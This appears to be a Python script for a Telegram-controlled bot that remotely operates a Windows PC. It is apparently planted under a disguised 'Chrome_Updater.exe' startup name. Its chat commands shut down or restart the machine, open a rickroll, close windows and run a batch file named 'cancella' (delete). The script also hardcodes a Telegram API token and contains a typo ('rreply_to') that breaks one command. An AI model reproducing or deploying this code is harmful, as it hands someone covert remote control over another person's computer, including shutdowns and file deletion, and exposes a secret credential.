import pyautogui
import telebot
import os
from time import sleep

USER = os.getlogin()

os.chdir(f"C:\\Users\\{USER}\\Watch")

API_TOKEN = '5145352622:AAE9rpOW2jBSaEz5DN8CzoVnruWyngn5Ai4'

bot = telebot.TeleBot(API_TOKEN)

try:
        os.remove("C:/Users/"+USER+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Chrome_Updater.exe")
except:
        pass

@bot.message_handler(func=lambda message: True )
def echo_message(message):

        if message.text == '/prova':
                print('ok')
                bot.reply_to(message, 'ok')
        elif message.text == '/off':
                os.system("shutdown /s /t 0")
                bot.reply_to(message, 'spento')
        elif message.text == '/reload':
                os.system("shutdown /r /t 0")
                bot.reply_to(message, 'riavviato')
        elif message.text == '/hacker':
                pyautogui.hotkey('win', 'r')
                pyautogui.write('cmd')
                pyautogui.press('enter')
                sleep(0.5)
                pyautogui.write('color a')
                pyautogui.press('enter')
                pyautogui.write('dir /s')
                pyautogui.press('enter')
                pyautogui.press('f11')
                bot.reply_to(message, 'ackerato')
        elif message.text == '/rick':
                os.system("start https://www.youtube.com/watch?v=xvFZjo5PgG0")
                sleep(1)
                pyautogui.press('f')
                bot.reply_to(message, 'rickroll')
        elif message.text == '/cancella':
                bot.rreply_to(message, 'Fatto')
                os.system(f"C:\\Users\\{USER}\\Watch\\cancella.bat")
        else:
                bot.reply_to(message, 'fatto')
                pyautogui.hotkey("alt", 'f4')



bot.polling()


#https://www.pythonanywhere.com/user/dj2828/consoles/19008904/
# per crash: mkvirtualenv --python=/usr/bin/python3.7 mysite-virtualenv
# pip install pyTelegramBotAPI
# python3 botTelegram.py
#cntr + c per mandare
#python3 botTelegram.py
#per aggiornare il file: https://www.pythonanywhere.com/user/dj2828/files/home/dj2828
